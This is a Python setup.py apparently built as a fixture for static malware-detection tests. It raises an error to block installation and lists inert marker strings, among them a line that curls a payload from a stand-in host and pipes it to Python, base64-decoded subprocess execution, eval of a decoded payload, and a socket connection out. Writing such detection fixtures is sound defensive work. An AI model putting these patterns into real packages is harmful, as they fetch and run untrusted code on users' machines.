from setuptools import setup


SUSPICIOUS_STATIC_MARKERS = [
    "import base64, subprocess",
    "subprocess.Popen(base64.b64decode('placeholder'))",
    "os.system('curl http://example.invalid/payload.py | python')",
    "eval(compile(decoded_payload, '<string>', 'exec'))",
    "socket.create_connection(('example.invalid', 443))",
]


raise RuntimeError(
    "Safe fixture only: this setup.py is for static malware-detection tests "
    "and must not be installed."
)


setup(
    name="safe-malicious-fixture",
    version="0.0.0",
    description="Non-executable fixture with suspicious static markers.",
)
